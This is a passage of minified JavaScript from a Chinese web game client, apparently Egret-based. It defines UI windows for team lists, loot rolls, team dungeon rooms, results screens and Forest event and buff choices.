eui.ArrayCollection(a.CityCC.ins().teamApplyList)},e.prototype.updateData=function(){this.isHasTemp!=!!a.CityCC.ins().teamId?(this.isHasTemp=!!a.CityCC.ins().teamId,this.updateTab(),this.updateView()):this.isHasTemp=!!a.CityCC.ins().teamId,this.isHasTemp&&a.CityCC.ins().sendTeamItemInfo(),this.cb0.selected=a.CityCC.ins().isAtuoTeam},e.prototype.updateTab=function(){var t=[];t=this.isHasTemp?a.CityCC.ins().leaderId==s.ActorCC.actorID?[gettext("附近队伍"),gettext("我的队伍"),gettext("入队申请")]:[gettext("附近队伍"),gettext("我的队伍")]:[gettext("附近队伍")],this.eTab.selectedIndex>1||(this.tabIdx=this.isHasTemp?1:0,this.eTab.dataProvider=new eui.ArrayCollection(t),this.eTab.selectedIndex=this.tabIdx)},e.prototype.updateView=function(){this.goBtn.visible=!this.tabIdx&&!this.isHasTemp,this.grp2.visible=1==this.tabIdx,this.sc.visible=0==this.tabIdx,this.sc3.visible=2==this.tabIdx,this.exitBtn2.enabled=this.grp2.visible&&a.CityCC.ins().leaderId==s.ActorCC.actorID},e.prototype.onClick=function(t){var e;switch(t.currentTarget){case this.goBtn:a.CityCC.ins().sendTeamChange(1);break;case this.exitBtn1:a.CityCC.ins().sendTeamChange(2),a.CityCC.ins().teamApplyList=[];break;case this.exitBtn2:r.WarnWin.show(gettext("是否解散当前队伍?"),function(){a.CityCC.ins().sendTeamChange(7),a.CityCC.ins().teamApplyList=[]},this);break;case this.cb0:this.cb0.selected=a.CityCC.ins().isAtuoTeam,a.CityCC.ins().sendTeamChange(6);break;case this.exitBtn:win.close(this);break;case this.btnHelp:win.open("CommonHelpWin",null===(e=o.GlobalConfig.HelpInfoConfig[208])||void 0===e?void 0:e.text)}},e.prototype.onItemClick=function(t){this.tabIdx!=t.currentTarget.selectedIndex&&(this.tabIdx=t.currentTarget.selectedIndex,this.updateView())},e.prototype.removeDisplay=function(){},e}(n.BaseView);e.TeamCityListWin=p,window.TeamCityListWin=p,__reflect(p.prototype,"TeamCityListWin",[]),window.TeamCityListWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamCityRollItem=e.TeamCityRollWin=void 0;var n=i(8),o=i(3),s=i(1),a=i(0),r=i(48),l=i(10),h=i(43),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamCityRollSkin",e.listArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=p,this.list.dataProvider=this.arrC=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.addData,h.CityCC.ins().teamAddRollItemS),observe(this,this.checkList,h.CityCC.ins().teamCheckTimeRollItemS),observe(this,this.updateData2,h.CityCC.ins().teamRemoveRollItem),this.addTouchEvent(this.exitBtn,this.onClick),this.listArr=t[0],this.arrC.replaceAll(this.listArr)},e.prototype.updateItemRoll=function(t){for(var e=0;e<this.listArr.length;e++)if(this.listArr[e].id==t.id){this.listArr[e].roll=t.roll;break}this.arrC.replaceAll(this.listArr)},e.prototype.addData=function(t){for(var e=[],i=0;i<t.length;i++){for(var n=0;n<this.listArr.length;n++)t[i].id!=this.listArr[n].id;e.push(t[i])}for(var i=0;i<e.length;i++)this.listArr.push(e[i]);this.arrC.replaceAll(this.listArr)},e.prototype.checkList=function(){for(var t=this.listArr.length-1;t>=0;t--)this.listArr[t].time||this.listArr.splice(t,1);return this.listArr.length?void this.arrC.replaceAll(this.listArr):void win.close(this)},e.prototype.updateData2=function(t){if(this.listArr.length<=1)return void win.close(this);for(var e=0;e<this.listArr.length;e++)if(this.listArr[e].id==t){this.listArr.splice(e,1);break}this.arrC.replaceAll(this.listArr)},e.prototype.onClick=function(){win.close(this)},__decorate([delayCall(100)],e.prototype,"checkList",null),e}(s.BaseView);e.TeamCityRollWin=u,window.TeamCityRollWin=u,__reflect(u.prototype,"TeamCityRollWin",[]),window.TeamCityRollWin=u;var p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){Timer.stopAll(this),this.addTouchEvent(this.goBtn,this.onClick),this.addTouchEvent(this.backBtn,this.onClick)},e.prototype.dataChanged=function(){this.roll.text=this.data.roll?"Roll:"+this.data.roll:"";var t=this.data.itemId,e=a.GlobalConfig.ItemConfig[t];return this.jobLab.text=r.Role.getJobNameByJob(l.ItemUtil.getJob(e)),this.lvLab.text=""+(null===e||void 0===e?void 0:e.level),this.item.data={type:1,id:t,count:1,quality:this.data.itemQx},this.item.setImgBg2("quality"+this.data.itemQx),(this.data.time-egret.getTimer())/1e3>0?(this.timeLab.text=gettext("剩余时间:")+n.DateUtils.getFormatBySecond((this.data.time-egret.getTimer())/1e3,n.DateUtils.TIME_FORMAT_1),void Timer.start(1e3,0,this.timeFun,this)):void(this.timeLab.text="")},e.prototype.timeFun=function(){h.CityCC.ins().sendTeamRoll(this.data.id, 1);h.CityCC.ins().teamRemoveRollItem(this.data.id);var t=egret.getTimer();return(this.data.time-t)/1e3<=0?(this.data.time=0,this.timeLab.text="",Timer.stop(this.timeFun,this),void h.CityCC.ins().teamCheckTimeRollItemS()):void(this.timeLab.text=gettext("剩余时间:")+n.DateUtils.getFormatBySecond((this.data.time-t)/1e3,n.DateUtils.TIME_FORMAT_1))},e.prototype.onClick=function(t){switch(t.currentTarget){case this.goBtn:h.CityCC.ins().sendTeamRoll(this.data.id,1);break;case this.backBtn:h.CityCC.ins().sendTeamRoll(this.data.id,0)}h.CityCC.ins().teamRemoveRollItem(this.data.id)},e}(o.BaseItemRender);e.TeamCityRollItem=p,window.TeamCityRollItem=p,__reflect(p.prototype,"TeamCityRollItem",[]),window.TeamCityRollItem=p},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbGuideWin=void 0;var n=i(1),o=i(387),s=i(0),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isNormal=!0,e._sn_="teamFbGuideSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.TeamFbGuideItemrender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._roomId=t[0],this.isNormal=t[1],this.update()},e.prototype.update=function(){if(this.isNormal){this.fbName.source=s.GlobalConfig.TeamFuBenConfig[this._roomId].nameImg,this._collect||(this._collect=new eui.ArrayCollection,this.list.dataProvider=this._collect);for(var t=Object.keys(s.GlobalConfig.TeamFuBenGuideConfig[this._roomId]).length,e=[],i=1;t>=i;i++)e.push(s.GlobalConfig.TeamFuBenGuideConfig[this._roomId][i]);this._collect.source=e}else{this.fbName.source=s.GlobalConfig.TeamFuBenExConfig[this._roomId].nameImg,this._collect||(this._collect=new eui.ArrayCollection,this.list.dataProvider=this._collect);for(var t=Object.keys(s.GlobalConfig.TeamFuBenexGuideConfig[this._roomId]).length,e=[],i=1;t>=i;i++)e.push(s.GlobalConfig.TeamFuBenexGuideConfig[this._roomId][i]);this._collect.source=e}},e}(n.BaseView);e.TeamFbGuideWin=a,window.TeamFbGuideWin=a,__reflect(a.prototype,"TeamFbGuideWin",[]),window.TeamFbGuideWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbInviteWin=void 0;var n=i(1),o=i(4),s=i(32),a=i(249),r=i(2),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._deDes="",e._sn_="teamFbInviteSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._deDes=t[0],this._room=t[1],this._configID=t[2],this.input.text=this._deDes,this.input.maxChars=40,this.addTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){switch(t.target){case this.worldInviteBtn:if(this._configID){var e=s.FbCT.ins().getTfInviteCD();if(e>0)return void r.TipsCT.ins().showTips(gettext("{0}秒后才能世界邀请",e));s.FbCT.ins().isNormal?s.FbCT.ins().sendTfSysInvite(this.getDes()+gettext("|E:1,{0},&U:&C:{1}&T:快速加入",s.FbCT.ins().tfRoomID,65280)):s.FbCT.ins().sendPurgatoryTfSysInvite(this.getDes()+gettext("|E:1,{0},&U:&C:{1}&T:快速加入",s.FbCT.ins().tfPurgatoryRoomID,65280))}else{var i=a.RareAnimalCT.ins();if(i.cdCount>0)return void r.TipsCT.ins().showTips(gettext("{0}秒后才能世界邀请",i.cdCount));i.sendInvite(this.getDes()+gettext("|E:7,{0},&U:&C:{1}&T:快速加入",i.teamID,65280))}win.close(this)}},e.prototype.getDes=function(){var t=this.input.text?this.input.text:this._deDes,e="[|C:1487615&T:"+o.ActorCC.myName+"|]";return t=t==this._deDes?t.replace(gettext("我"),e):e+t},e}(n.BaseView);e.TeamFbInviteWin=l,window.TeamFbInviteWin=l,__reflect(l.prototype,"TeamFbInviteWin",[]),window.TeamFbInviteWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbNewPanel=void 0;var n=i(1),o=i(32),s=i(0),a=i(11),r=i(5),l=i(388),h=i(20),u=i(2),p=i(12),d=i(15),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbSkin",e.id=1,e.items=[],e.states=["normal","purgatory"],e.isNormal=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eList.itemRenderer=a.ItemBase,this.eTxt.textFlow=r.TextFlowMaker.generateTextFlow1("|U:&T:"+this.eTxt.text)},e.prototype.addDisplay=function(){observe(this,this.update,o.FbCT.ins().postFBInfoUpdate),observe(this,this.updateFBInfo,o.FbCT.ins().exitPurgatoryTFRoom),this.changeDif.visible=p.OpenSystem.ins().checkSysOpen(d.SystemType.Lianyu),this.updateFBInfo()},e.prototype.updateFBInfo=function(){this.currentState=this.isNormal?this.states[0]:this.states[1],this.validateNow(),this.initView(),this.update(),this.eSscrollV()},e.prototype.initView=function(){this.clearItem(),this.items=[];var t;t=this.isNormal?s.GlobalConfig.TeamFuBenConfig:s.GlobalConfig.TeamFuBenExConfig;var e;for(var i in t){e=this.isNormal?t[i].id==o.FbCT.ins().tfPassID+1:t[i].id==o.FbCT.ins().tfPurgatoryPassID+1,e&&(this.id=t[i].id);var n=new l.TeamFbItem(t[i],this.isNormal);this.eG.addChild(n),this.items.push(n)}},e.prototype.clearItem=function(){1!=this.eG.numElements&&this.eG&&this.eG.numElements>1&&(this.eG.removeChildren(),this.eG.addChild(this.contentGroup))},e.prototype.eSscrollV=function(){this.eSc.viewport.validateNow();var t;t=this.isNormal?s.GlobalConfig.TeamFuBenConfig[this.id]:s.GlobalConfig.TeamFuBenExConfig[this.id];var e=t?Math.max(0,t.showPos[1]-this.eSc.parent.height/2):0,i=(this.eSc.viewport.contentHeight||this.contentGroup.height)-this.eSc.viewport.height,n=e>i?i:e;0>n&&(n=0),this.eSc.viewport.scrollV=n},e.prototype.onClick=function(t){if(t.target instanceof l.TeamFbItem&&t.target.cfg)return this.id=t.target.cfg.id,void this.update();switch(t.target){case this.eBtn:if(h.GameMap.fbType!=o.FbCT.FB_TYPE_CITY&&h.GameMap.fbType!=o.FbCT.FB_TYPE_GUANQIABOSS)return void u.TipsCT.ins().showTips(gettext("正在其他副本中，不能挑战"));o.FbCT.ins().isNormal=this.isNormal,win.open("TeamFbRoomWin",this.state,this.cfg.id,0);break;case this.eTxt:win.open("TeamFbGuideWin",this.cfg.id,this.isNormal);break;case this.eCloseBtn:win.close(this);break;case this.changeDif:this.isNormal=!this.isNormal,this.currentState=this.isNormal?this.states[0]:this.states[1],this.isNormal?o.FbCT.ins().sendTFRank():o.FbCT.ins().sendPurgatoryTFRank(),this.id=1,this.updateFBInfo()}},Object.defineProperty(e.prototype,"state",{get:function(){return this.isNormal?o.FbCT.ins().tfPassID>=this.cfg.id?2:this.cfg.id==o.FbCT.ins().tfPassID+1?1:0:o.FbCT.ins().tfPurgatoryPassID>=this.cfg.id?2:this.cfg.id==o.FbCT.ins().tfPurgatoryPassID+1?1:0},enumerable:!1,configurable:!0}),e.prototype.update=function(){var t,e;this.isNormal?this.cfg=s.GlobalConfig.TeamFuBenConfig[this.id]:this.cfg=s.GlobalConfig.TeamFuBenExConfig[this.id],this.eBtn.visible=1==this.state,this.ePass.visible=2==this.state;var i;i=this.isNormal?this.cfg.id>o.FbCT.ins().exTfPassID:this.cfg.id>o.FbCT.ins().exPurgatoryTfPassID;var n=i?this.cfg.rewardFirstShow:this.cfg.rewardShow;this.rewardFirstShow.visible=i,this.rewardShow.visible=!i,this.eList.dataProvider=new eui.ArrayCollection(n),this.eDesc.textFlow=r.TextFlowMaker.generateTextFlow(this.cfg.infoText),this.eName.text=this.cfg.bossName,this.eTitle.source=this.cfg.nameImg;var a=s.GlobalConfig.MonstersConfig[this.cfg.bossId];this.eHead.source="monhead"+(null===a||void 0===a?void 0:a.head)+"_png",this.eInfo.text="",0==this.state&&(this.isNormal?this.eInfo.textFlow=r.TextFlowMaker.generateTextFlow(gettext("通关{0}后可开启挑战",(null===(t=s.GlobalConfig.TeamFuBenConfig[this.id-1])||void 0===t?void 0:t.name)||"")):this.eInfo.textFlow=r.TextFlowMaker.generateTextFlow(gettext("通关{0}后可开启挑战",(null===(e=s.GlobalConfig.TeamFuBenExConfig[this.id-1])||void 0===e?void 0:e.name)||"")))},e.prototype.tabRp=function(){return!1},e.openCheck=function(){return o.FbCT.ins().isTeamFBOpen(!0)},__decorate([delayCall(50)],e.prototype,"eSscrollV",null),e}(n.BaseView);e.TeamFbNewPanel=c,window.TeamFbNewPanel=c,__reflect(c.prototype,"TeamFbNewPanel",[]),window.TeamFbNewPanel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbResultWin=void 0;var n=i(1),o=i(11),s=i(0),a=i(4),r=i(32),l=i(389),h=i(251),u=i(20),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbResultSkin",e.defaultRect=!1,e._result=0,e.isCaptain=!0,e.curMapID=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listItem.itemRenderer=o.ItemBase,this.listChallenger.itemRenderer=h.ChallengerHeadItemRender,this.listAssistant.itemRenderer=l.AssistantHeadItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.changeScene,Ts.enterScene),this._configID=t[0],this._result=t[1],this._list=t[2],this.curMapID=u.GameMap.mapID,this.addTouchEvent(this,this.onTouch),this.update()},e.prototype.removeDisplay=function(){},e.prototype.update=function(){var t,e,i,n;this.bg.source=this._result?"teamFb_win_png":"teamFb_lose_png",this._hasCaptain=!1;for(var o,l,h=[],u=0;u<this._list.length;u++)this._list[u].roleID==a.ActorCC.actorID&&(l=this._list[u]),2==this._list[u].position?(o=this._list.splice(u,1)[0],h.push(o),o.roleID==a.ActorCC.actorID&&(this.isCaptain=!1),u--,this._hasCaptain=!0):1==this._list[u].position&&(this._list[u].roleID==a.ActorCC.actorID?this.isCaptain=!0:this.isCaptain=!1);var p=[];p=0==l.isSignal?r.FbCT.ins().isNormal?null===(t=s.GlobalConfig.TeamFuBenConfig[this._configID])||void 0===t?void 0:t.rewardFirstShow:null===(e=s.GlobalConfig.TeamFuBenExConfig[this._configID])||void 0===e?void 0:e.rewardFirstShow:1==l.isSignal?r.FbCT.ins().isNormal?null===(i=s.GlobalConfig.TeamFuBenConfig[this._configID])||void 0===i?void 0:i.rewardShow:null===(n=s.GlobalConfig.TeamFuBenExConfig[this._configID])||void 0===n?void 0:n.rewardShow:[],this.lab1.visible=!p.length,this.listItem.dataProvider=new eui.ArrayCollection(p),this.currentState=this.isCaptain&&this._result?"captain":"help",this.win.visible=this._result>0,this.defeat.visible=0==this._result,this.assistantLab.visible=this._hasCaptain,this.assResultTxt.visible=!this.isCaptain&&!!this._result,this.listChallenger.dataProvider=new eui.ArrayCollection(this._list);for(var d=h.length,c=[],u=0;d>u;u++)c.push({vo:h[u],id:this._configID});this.listAssistant.dataProvider=new eui.ArrayCollection(c);var f=r.FbCT.ins().isNormal?s.GlobalConfig.TeamFuBenConfig:s.GlobalConfig.TeamFuBenExConfig;return 0==this._result||this._configID>=Object.keys(f).length?this.challengeBtn.visible=!1:this.challengeBtn.visible=this.closeBtn.visible,this._result?(this._exitTime=30,Timer.start(1e3,0,this.repeate,this),void this.repeate()):void(this.closeBtn.label=gettext("退出"))},e.prototype.onTouch=function(t){switch(t.target){case this.closeBtn:this.exitFb();break;case this.challengeBtn:this.exitFb(1)}},e.prototype.repeate=function(){return this.closeBtn.label=this.isCaptain?gettext("退出(")+this._exitTime+"s)":gettext("退出"),this.assResultTxt.text=gettext("等待队长操作(")+this._exitTime+"s)",this._exitTime<=0?(console.log("end",this._exitTime),Timer.stopAll(this),void this.exitFb()):(this._exitTime--,void console.log("this._exitTime",this._exitTime))},e.prototype.exitFb=function(t){void 0===t&&(t=0);var e=r.FbCT.ins().isNormal?s.GlobalConfig.TeamFuBenConfig:s.GlobalConfig.TeamFuBenExConfig;0==this._result||this._configID>=Object.keys(e).length?send(Ts.exitFB):this.isCaptain?r.FbCT.ins().isNormal?r.FbCT.ins().sendExitTFFb(t):r.FbCT.ins().sendExitPurgatoryTFFb(t):send(Ts.exitFB),win.close(this)},e.prototype.changeScene=function(){u.GameMap.fbType!=r.FbCT.FB_TYPE_GUANQIABOSS&&u.GameMap.fbType!=r.FbCT.FB_TYPE_CITY&&this.curMapID!=u.GameMap.mapID&&win.close(this)},e}(n.BaseView);e.TeamFbResultWin=p,window.TeamFbResultWin=p,__reflect(p.prototype,"TeamFbResultWin",[]),window.TeamFbResultWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFbRoomWin=void 0;var n=i(8),o=i(5),s=i(1),a=i(0),r=i(4),l=i(13),h=i(32),u=i(7),p=i(2),d=i(27),c=i(26),f=i(236),g=i(164),m=i(45),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbRoomSkin",e._state=0,e._room=0,e.defaultRect=!1,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._state=t[0],h.FbCT.ins().isNormal?this._config=a.GlobalConfig.TeamFuBenConfig[t[1]]:this._config=a.GlobalConfig.TeamFuBenExConfig[t[1]],this._room=t[2],h.FbCT.ins().isNormal?(observe(this,this.onRoomInfoChange,h.FbCT.ins().postFTRoomChange),observe(this,this.createSuccess,h.FbCT.ins().postCreateTFRoomSuccess)):(observe(this,this.onRoomInfoChange,h.FbCT.ins().postPurgatoryFTRoomChange),observe(this,this.createSuccess,h.FbCT.ins().postCreatePurgatoryTFRoomSuccess)),observe(this,this.UpdateListMsg,m.ChatCT.ins().postNewChatMsg),observe(this,this.UpdateListMsg,m.ChatCT.ins().postDelMsg),this.chatList.itemRenderer=g.ChatListItemRenderer,this.chatList.dataProvider=null,this.addTouchEvent(this,this.onTouch),this.update(),this.onRoomInfoChange(),this.updateChatList(),this.refushBar()},e.prototype.updateChatList=function(){this.chatList.dataProvider=m.ChatCT.ins().chatListData},e.prototype.refushBar=function(){Timer.start(500,1,this.refushBarList,this)
},e.prototype.refushBarList=function(){0!=this.scr.viewport.contentHeight&&(this.scr.viewport.validateNow(),this.scr.viewport.contentHeight>this.scr.height&&(this.scr.viewport.scrollV=this.scr.viewport.contentHeight-this.scr.height))},e.prototype.createSuccess=function(){h.FbCT.ins().isNormal?this._room=h.FbCT.ins().tfRoomID:this._room=h.FbCT.ins().tfPurgatoryRoomID,this.onRoomInfoChange()},e.prototype.update=function(){if(this.eName.source=this._config.nameImg,this.eTxt.visible=!1,this.eInfo.text="",this.eGroup.visible=!0,this.eBtn.visible=!1,this.leader.visible=this.member1.visible=this.member2.visible=!1,0==this._state)this.eGroup.visible=!1,h.FbCT.ins().isNormal?this.eInfo.textFlow=o.TextFlowMaker.generateTextFlow(gettext("通关{0}后可开启挑战",a.GlobalConfig.TeamFuBenConfig[this._config.id-1].name)):this.eInfo.textFlow=o.TextFlowMaker.generateTextFlow(gettext("通关{0}后可开启挑战",a.GlobalConfig.TeamFuBenExConfig[this._config.id-1].name));else if(2==this._state){this.eTxt.visible=!0,this.member1.visible=this.member2.visible=!1;var t=new f.TeamFuBenRoleVo,e=l.SubRoles.ins().getSubRoleByIndex(0);t.roleID=r.ActorCC.actorID,t.position=1,t.roleName=r.ActorCC.myName,t.job=e.job,t.sex=e.sex,t.zs=c.ZsCT.ins().stage,t.lv=e.lv,this.leader.data={vo:t,configID:this._config.id},this.leader.visible=!0}else this.eBtn.visible=!0,this._room<=0&&(h.FbCT.ins().isNormal?h.FbCT.ins().sendCreateTFRoom():h.FbCT.ins().sendCreatePurgatoryTFRoom());this.scr.height=this.eGroup.height,this.refushBarList()},e.prototype.UpdateListMsg=function(){this.scr.height=this.eGroup.height,this.refushBarList()},e.prototype.onRoomInfoChange=function(){if(this._room){var t,e,i=[this.member1,this.member2];if(h.FbCT.ins().isNormal){t=h.FbCT.ins().tfMembers?h.FbCT.ins().tfMembers.length:0;for(var n=0;t>n;n++)1==h.FbCT.ins().tfMembers[n].position?this.leader.data={vo:h.FbCT.ins().tfMembers[n],configID:this._config.id}:(e=i.shift(),e.data={vo:h.FbCT.ins().tfMembers[n],configID:this._config.id})}else{t=h.FbCT.ins().tfPurgatoryMembers?h.FbCT.ins().tfPurgatoryMembers.length:0;for(var n=0;t>n;n++)1==h.FbCT.ins().tfPurgatoryMembers[n].position?this.leader.data={vo:h.FbCT.ins().tfPurgatoryMembers[n],configID:this._config.id}:(e=i.shift(),e.data={vo:h.FbCT.ins().tfPurgatoryMembers[n],configID:this._config.id})}t=i.length;for(var n=0;t>n;n++)i[n].data={vo:null,configID:this._config.id};i.length=0,i=null,this.member1.visible=null!=this.member1.data,this.member2.visible=null!=this.member2.data,this.leader.visible=null!=this.leader.data,this.validateNow()}},e.prototype.onTouch=function(t){var e=this;switch(t.target){case this.eBtn:var i=new Date(u.GameServerCC.serverTime);if(i.getDay()==a.GlobalConfig.TeamFuBenBaseConfig.closeTime[0]&&i.getHours()>=a.GlobalConfig.TeamFuBenBaseConfig.closeTime[1])return p.TipsCT.ins().showTips(gettext("每周{0}{1}点后不能挑战",n.DateUtils.WEEK_CN[a.GlobalConfig.TeamFuBenBaseConfig.closeTime[0]],a.GlobalConfig.TeamFuBenBaseConfig.closeTime[1])),void win.close(this);if(h.FbCT.ins().isNormal){if(!h.FbCT.ins().isTFCaptain)return void p.TipsCT.ins().showTips(gettext("队长才能开启进入副本"));h.FbCT.ins().sendBeginTF()}else{if(!h.FbCT.ins().isPurgatoryTFCaptain)return void p.TipsCT.ins().showTips(gettext("队长才能开启进入副本"));h.FbCT.ins().sendBeginPurgatoryTF()}win.close(this);break;case this.eCloss:case this.eRect:1==this._state?d.WarnWin.show(gettext("是否退出房间"),function(){h.FbCT.ins().isNormal?h.FbCT.ins().sendExitTFRoom():h.FbCT.ins().sendExitPurgatoryTFRoom(),win.close(e)},this):win.close(this);break;case this.eChat:win.open("ChatWin")}},e.prototype.getConfigFbId=function(){var t;return null===(t=this._config)||void 0===t?void 0:t.fbid},e}(s.BaseView);e.TeamFbRoomWin=v,window.TeamFbRoomWin=v,__reflect(v.prototype,"TeamFbRoomWin",[]),window.TeamFbRoomWin=v},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestBattleResultWin=void 0;var n=i(1),o=i(0),s=i(54),a=i(87),r=function(t){function e(){var e=t.call(this)||this;return e.layoutNum=LayoutNum.top,e._sn_="ForestBattleResult",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.sureBtn,this.onClick),observe(this,this.moveComplete,s.Fb2CT.ins().postForestInfo),observe(this,this.moveComplete,s.Fb2CT.ins().postForestMapLv)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.data=t[0],0==this.data?(this.winType.visible=!1,this.failType.visible=!0):1==this.data&&(this.winType.visible=!0,this.failType.visible=!1),this.lbStarNum.text=a.ForestModel.ins().getStarCount()+"";var i=o.GlobalConfig.ItemConfig[2902];this.imgGoods1.source=RES_DIR_ITEMICON+i.icon+".png";var n=o.GlobalConfig.ItemConfig[2901];this.imgGoods2.source=RES_DIR_ITEMICON+n.icon+".png"},e.prototype.onClick=function(t){win.close(this)},e.prototype.removeDisplay=function(){1==this.data&&2==a.ForestModel.ins().forestState&&win.open("ForestBuffChoiceWin")},e.prototype.moveComplete=function(t){void 0===t&&(t=null),this.lbStarNum.text=a.ForestModel.ins().getStarCount()+""},e}(n.BaseView);e.ForestBattleResultWin=r,window.ForestBattleResultWin=r,__reflect(r.prototype,"ForestBattleResultWin",[]),window.ForestBattleResultWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestBuffChoiceWin=void 0;var n=i(1),o=i(0),s=i(54),a=i(87),r=i(2),l=i(393),h=i(394),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layoutNum=LayoutNum.top,e._sn_="ForestBuffChoice",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=l.ForestBuffChoiceItem,this.eList.dataProvider=this.eArc=new eui.ArrayCollection,this.addTouchEvent(this.eList,this.onTouch),this.addTouchEvent(this.checkBtn,this.onTouch2),this.addTouchEvent(this,this.onTouch2)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];for(var i,n=a.ForestModel.ins().mapInofList,s=a.ForestModel.ins().forestLocation,r=0;r<n.length;r++){var l=n[r];if(l.location==s){i=l;break}}for(var h=o.GlobalConfig.YoumingForestMonsterEventConfig[i.eventId],u=[],p=0;p<i.eventList.length;p++){var l=h.buff[i.eventList[p]-1];u[p]=[l,i.eventList[p]-1,i.eventList[p]]}this.eArc.source=u},e.prototype.update=function(){},e.prototype.onTouch=function(t){for(var e=0;e<this.eList.numElements;e++){var i=this.eList.getElementAt(e);e==this.eList.selectedIndex?i.setSelect(!0):i.setSelect(!1)}},e.prototype.onTouch2=function(t){switch(t.target){case this.sureBtn:if(-1==this.eList.selectedIndex)return void r.TipsCT.ins().showTips(gettext("未选中BUFF"));var e=this.eList.selectedItems[0];s.Fb2CT.ins().sendForestEvent(e[2]),this.delayCallWin();break;case this.checkBtn:win.open(h.ForestBuffWin)}},e.prototype.delayCallWin=function(){win.open("ForestWin"),win.close(this)},__decorate([delayCall(300)],e.prototype,"delayCallWin",null),e}(n.BaseView);e.ForestBuffChoiceWin=u,window.ForestBuffChoiceWin=u,__reflect(u.prototype,"ForestBuffChoiceWin",[]),window.ForestBuffChoiceWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestEvent1Win=void 0;var n=i(1),o=i(11),s=i(0),a=i(54),r=i(87),l=function(t){function e(){for(var e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var n=t.call(this)||this;return n._sn_="ForestEvent1",n}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.data=t[0];var i=s.GlobalConfig.YoumingForestMonsterEventConfig[this.data.eventId],n=s.GlobalConfig.YoumingForestEventConfig[this.data.eventId],a=s.GlobalConfig.YoumingForestBaseConfig;6==n.type?(this.currentState="state_boss",this.eList.itemRenderer=o.ItemBase,this.eList.dataProvider=this.eArc=new eui.ArrayCollection,this.eArc.source=i.rewardPreview[1]):this.currentState="state_monster",this.monster.source="monhead"+i.head+"_png",this.txt_name.text=i.name,this.eList.width=105*this.eList.numElements,this.txt_power0.text=gettext("{0}秒内击败可获得{1}",a.youmingForestFubenStar[2][0],a.youmingForestFubenStar[2][1]),this.txt_power1.text=gettext("{0}秒内击败可获得{1}",a.youmingForestFubenStar[1][0],a.youmingForestFubenStar[1][1]),this.txt_power2.text=gettext("{0}秒内击败可获得{1}",a.youmingForestFubenStar[0][0],a.youmingForestFubenStar[0][1]);var t0=GlobalConfig.YoumingForestBuffConfig[i.buff[this.data.eventList[0]-1]],t1=GlobalConfig.YoumingForestBuffConfig[i.buff[this.data.eventList[1]-1]],t2=GlobalConfig.YoumingForestBuffConfig[i.buff[this.data.eventList[2]-1]];this.txt_power0.text=t0.title,this.txt_power0.textColor = ItemUtil.getQualityColor(t0.quality),this.txt_power1.text=t1.title,this.txt_power1.textColor = ItemUtil.getQualityColor(t1.quality),this.txt_power2.text=t2.title,this.txt_power2.textColor = ItemUtil.getQualityColor(t2.quality)},e.prototype.onClick=function(t){switch(t.target){case this.sureBtn:win.close(this);break;case this.notBtn:r.ForestModel.ins().forestState=0,a.Fb2CT.ins().sendForestPoint(this.data.location)}},e}(n.BaseView);e.ForestEvent1Win=l,window.ForestEvent1Win=l,__reflect(l.prototype,"ForestEvent1Win",[]),window.ForestEvent1Win=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestEvent2Win=void 0;var n=i(1),o=i(0),s=i(54),a=i(87),r=i(396),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="ForestEvent2",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eList.itemRenderer=r.ForestStoreItems,this.eList.dataProvider=this.listArc=new eui.ArrayCollection,observe(this,this.buyUpData,s.Fb2CT.ins().postForestBuyData)},e.prototype.addDisplay=function(){for(var 